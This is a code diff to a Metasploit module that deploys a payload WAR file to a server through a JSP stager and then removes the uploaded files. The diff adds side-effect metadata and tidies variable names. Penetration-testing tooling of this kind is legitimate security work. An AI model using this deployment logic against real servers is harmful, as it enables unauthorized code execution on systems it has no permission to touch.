@@ -28,6 +28,11 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'DefaultAction' => 'Deploy',
       'License' => BSD_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -76,8 +81,8 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Calling stager to deploy the payload warfile (might take some time)')
     stager_uri = '/' + stager_base + '/' + stager_jsp_name + '.jsp'
-    stager_res = deploy('uri' => stager_uri,
-                        'method' => 'GET')
+    deploy('uri' => stager_uri,
+           'method' => 'GET')
 
     if res && res.code == 200
       print_good('Payload deployed')
@@ -94,11 +99,11 @@ class MetasploitModule < Msf::Auxiliary
     end
     delete_res << delete_file(stager_base + '.war', stager_jsp_name, '.jsp')
     delete_res << delete_file('./', stager_base + '.war', '')
-    delete_res.each do |res|
-      if !res
+    delete_res.each do |r|
+      if !r
         print_warning('Unable to remove WAR [No Response]')
-      elsif (res.code < 200 || res.code >= 300)
-        print_warning("WARNING: Unable to remove WAR [#{res.code} #{res.message}]")
+      elsif r.code < 200 || r.code >= 300
+        print_warning("WARNING: Unable to remove WAR [#{r.code} #{r.message}]")
       end
     end
   end
